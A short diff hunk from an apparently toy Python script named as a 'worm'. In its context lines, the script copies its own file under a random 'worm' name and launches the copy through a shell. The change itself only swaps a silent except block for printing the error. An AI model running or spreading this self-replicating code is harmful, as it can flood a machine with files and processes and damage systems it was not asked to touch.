@@ -14,5 +14,5 @@ try:
     file_name = "worm"+str(randint(2, 5000))+".py"
     copy(__file__, file_name)
     Popen((file_name), shell=True)
-except:
-    pass
+except Exception as e:
+    print(e)
